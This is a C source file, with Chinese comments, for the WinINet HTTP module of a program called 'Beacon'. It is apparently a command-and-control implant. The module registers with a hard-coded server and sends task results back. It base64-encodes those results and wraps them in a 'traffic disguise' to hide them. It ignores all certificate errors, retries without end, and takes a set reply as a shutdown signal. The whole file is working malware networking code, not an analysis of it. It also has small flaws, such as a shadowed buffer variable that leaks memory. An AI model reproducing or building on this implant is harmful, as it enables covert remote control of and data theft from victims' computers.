#include "beacon.h"

// 全局Internet会话句柄
static HINTERNET g_session = NULL;

// 初始化HTTP
BEACON_ERROR http_init(void) {
    // 初始化WinINet
    g_session = InternetOpenW(L"Beacon/" BEACON_VERSION,
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    if (!g_session) {
        return BEACON_ERROR_NETWORK;
    }

    // 设置默认超时
    DWORD timeout = 30000;  // 30秒
    InternetSetOption(g_session, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(g_session, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(g_session, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    return BEACON_SUCCESS;
}

// 发送HTTP请求
BEACON_ERROR http_send_request(HTTP_REQUEST* request, char** response, DWORD* response_len) {
    if (!request || !response || !response_len || !g_session) {
        return BEACON_ERROR_PARAMS;
    }

    BEACON_ERROR result = BEACON_ERROR_NETWORK;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char* encoded_data = NULL;
    char* wrapped_data = NULL;
    *response = NULL;
    *response_len = 0;

    // 重试循环
    while (1) {
        do {
            // 连接到服务器 - 根据SSL配置选择端口
            INTERNET_PORT port = USE_HTTPS ? HTTPS_PORT : SERVER_PORT;
            hConnect = InternetConnectW(g_session,
                SERVER_HOST,
                port,
                NULL,
                NULL,
                INTERNET_SERVICE_HTTP,
                0,
                0);

            if (!hConnect) {
                if (hRequest) InternetCloseHandle(hRequest);
                if (hConnect) InternetCloseHandle(hConnect);
                if (wrapped_data) free(wrapped_data);
                if (encoded_data) free(encoded_data);
                Sleep(60000); // 60秒重试
                continue;
            }

            // 创建请求
            DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
            if (request->use_ssl) {
                flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                         INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS;
            }

            hRequest = HttpOpenRequestW(hConnect,
                request->method,
                request->path,
                NULL,
                NULL,
                NULL,
                flags,
                0);

            if (!hRequest) {
                break;
            }

            // 设置超时
            if (request->timeout > 0) {
                InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT, &request->timeout, sizeof(DWORD));
                InternetSetOption(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &request->timeout, sizeof(DWORD));
                InternetSetOption(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &request->timeout, sizeof(DWORD));
            }

            // 如果使用SSL，设置忽略证书错误
            if (request->use_ssl) {
                DWORD dwFlags;
                DWORD dwBuffLen = sizeof(dwFlags);

                InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
                InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            }

            // 添加自定义Header
            WCHAR headers[256];
            swprintf_s(headers, 256, L"X-Request-ID: %s\r\n", CLIENT_TOKEN);
            HttpAddRequestHeadersW(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD);

            // 如果有数据要发送
            if (request->data) {
                const char* content_type = "application/json";
                size_t send_len = request->data_len;
                const char* send_data = request->data;
                char* wrapped_data = NULL;

                // 检查是否需要Base64编码
                if (request->path && (wcscmp(request->path, L"/register") == 0 ||
                                    wcscmp(request->path, API_ENDPOINT) == 0 ||
                                    wcsstr(request->path, L"/job/result") != NULL)) {
                    base64_encode((const unsigned char*)request->data, request->data_len, &encoded_data);
                    if (!encoded_data) {
                        break;
                    }

                    // 使用流量伪装包装Base64编码后的数据
                    wrapped_data = wrap_data_with_disguise(encoded_data);
                    if (!wrapped_data) {
                        free(encoded_data);
                        break;
                    }

                    send_data = wrapped_data;
                    send_len = strlen(wrapped_data);
                    content_type = "text/plain"; // Base64编码数据使用text/plain
                }

                // 设置Content-Type和Content-Length
                swprintf_s(headers, 256,
                    L"Content-Type: %hs\r\nContent-Length: %zu\r\n",
                    content_type, send_len);

                HttpAddRequestHeadersW(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

                // 发送请求 - 对于大数据使用分块发送
                if (send_len > 32768) { // 如果数据大于32KB，使用分块发送
                    INTERNET_BUFFERSW buffers = {0};
                    buffers.dwStructSize = sizeof(INTERNET_BUFFERSW);
                    buffers.dwBufferTotal = (DWORD)send_len;

                    if (!HttpSendRequestExW(hRequest, &buffers, NULL, 0, 0)) {
                        break;
                    }

                    // 分块发送数据
                    const char* data_ptr = send_data;
                    size_t remaining = send_len;
                    const size_t chunk_size = 32768; // 32KB chunks

                    while (remaining > 0) {
                        size_t to_send = (remaining > chunk_size) ? chunk_size : remaining;
                        DWORD bytes_written = 0;

                        if (!InternetWriteFile(hRequest, data_ptr, (DWORD)to_send, &bytes_written)) {
                            break;
                        }

                        if (bytes_written != to_send) {
                            break;
                        }

                        data_ptr += bytes_written;
                        remaining -= bytes_written;
                    }

                    if (remaining == 0) {
                        if (!HttpEndRequestW(hRequest, NULL, 0, 0)) {
                            break;
                        }
                    } else {
                        break;
                    }
                } else {
                    // 小数据直接发送
                    if (!HttpSendRequestW(hRequest, NULL, 0, (LPVOID)send_data, (DWORD)send_len)) {
                        break;
                    }
                }
            }
            else {
                // 发送无数据的请求
                if (!HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
                    break;
                }
            }

            // 获取状态码
            DWORD status_code = 0;
            DWORD status_code_size = sizeof(DWORD);
            if (!HttpQueryInfoW(hRequest,
                HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &status_code,
                &status_code_size,
                NULL)) {
                break;
            }

            if (status_code != 200) {
                break;
            }

            // 读取响应数据
            DWORD bytes_available = 0;
            DWORD bytes_read = 0;
            DWORD total_bytes_read = 0;
            char* temp_buffer = NULL;
            *response_len = INITIAL_BUFFER_SIZE;
            *response = (char*)malloc(*response_len);

            if (!*response) {
                break;
            }

            do {
                if (!InternetQueryDataAvailable(hRequest, &bytes_available, 0, 0)) {
                    free(*response);
                    *response = NULL;
                    break;
                }

                if (bytes_available == 0) break;

                // 如果需要更多空间
                if (total_bytes_read + bytes_available > *response_len) {
                    DWORD new_size = total_bytes_read + bytes_available + 1024;
                    temp_buffer = (char*)realloc(*response, new_size);
                    if (!temp_buffer) {
                        free(*response);
                        *response = NULL;
                        break;
                    }
                    *response = temp_buffer;
                    *response_len = new_size;
                }

                // 读取数据
                if (!InternetReadFile(hRequest,
                    *response + total_bytes_read,
                    bytes_available,
                    &bytes_read)) {
                    free(*response);
                    *response = NULL;
                    break;
                }

                total_bytes_read += bytes_read;

            } while (bytes_available > 0);

            if (*response) {
                // 确保数据以null结尾，但不包含在长度中
                if (total_bytes_read < *response_len) {
                    (*response)[total_bytes_read] = '\0';
                }
                *response_len = total_bytes_read;
                result = BEACON_SUCCESS;

                // 检查是否收到"It's Work!"响应
                if (total_bytes_read == 10 && strncmp(*response, "It's Work!", 10) == 0) {
                    result = BEACON_ERROR_SERVER_SHUTDOWN;
                }
            }

            break; // 如果成功获取响应，跳出重试循环

        } while (0);

        // 如果成功获取响应，跳出重试循环
        if (result == BEACON_SUCCESS || result == BEACON_ERROR_SERVER_SHUTDOWN) {
            break;
        }

        // 清理本次尝试的资源
        if (wrapped_data) {
            free(wrapped_data);
            wrapped_data = NULL;
        }
        if (encoded_data) {
            free(encoded_data);
            encoded_data = NULL;
        }
        if (hRequest) {
            InternetCloseHandle(hRequest);
            hRequest = NULL;
        }
        if (hConnect) {
            InternetCloseHandle(hConnect);
            hConnect = NULL;
        }

        // 等待60秒后重试
        Sleep(60000);
    }

    // 最终清理
    if (wrapped_data) {
        free(wrapped_data);
    }
    if (encoded_data) {
        free(encoded_data);
    }
    if (hRequest) {
        InternetCloseHandle(hRequest);
    }
    if (hConnect) {
        InternetCloseHandle(hConnect);
    }

    return result;
}

// 清理HTTP
void http_cleanup(void) {
    if (g_session) {
        InternetCloseHandle(g_session);
        g_session = NULL;
    }
} 